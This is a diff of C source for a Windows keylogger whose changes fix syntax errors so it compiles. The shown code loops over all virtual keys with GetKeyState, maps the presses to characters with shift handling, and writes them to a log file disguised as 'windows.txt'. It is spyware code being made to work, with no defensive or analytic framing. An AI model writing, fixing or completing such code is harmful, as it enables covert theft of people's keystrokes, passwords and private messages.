@@ -5,7 +5,7 @@
 
 #endif //KEYLOGGER_H
 DWORD WINAPI logg(){
-    int vkey.last_key_state(0xFF);
+    int vkey,last_key_state[0xFF];
     int isCAPSLOCK, isNUMLOCK;
     int isL_SHIFT,isR_SHIFT;
     int isPressed;
@@ -18,7 +18,7 @@ DWORD WINAPI logg(){
     FILE *kh;
     char KEY_LOG_FILE[]="windows.txt";
     //: making last key state 0
-    for(vkey=,;vkey<0xFF;vkey++){
+    for(vkey=0;vkey<0xFF;vkey++){
         last_key_state[vkey]=0;
     }
     
@@ -37,7 +37,7 @@ DWORD WINAPI logg(){
         //:checking state of all virtual keys
         for(vkey=0;vkey<0xFF;vkey++){
             isPressed=(GetKeyState(vkey)&0xFF00)>0?1:0;
-            showKey(char)vkey;
+            showKey=(char)vkey;
             if(isPressed==1 &&last_key_state[vkey]==0){
                 
                 //:for alphabets
@@ -69,12 +69,12 @@ DWORD WINAPI logg(){
                         showKey=chars_vs[vkey-0xBA];
                     }
                     else{
-                        shoKey=chars_vn[vkey-0xBA];
+                        showKey=chars_vn[vkey-0xBA];
                     }
                 }
                 else if(vkey>=0xDB && vkey<=0xDF){
                     if(isL_SHIFT==1 || isR_SHIFT==1){
-                        shoKey=chars_vb[vkey-0xDB];
+                        showKey=chars_vb[vkey-0xDB];
                     }
                     else{
                         showKey=chars_va[vkey-0xDB];
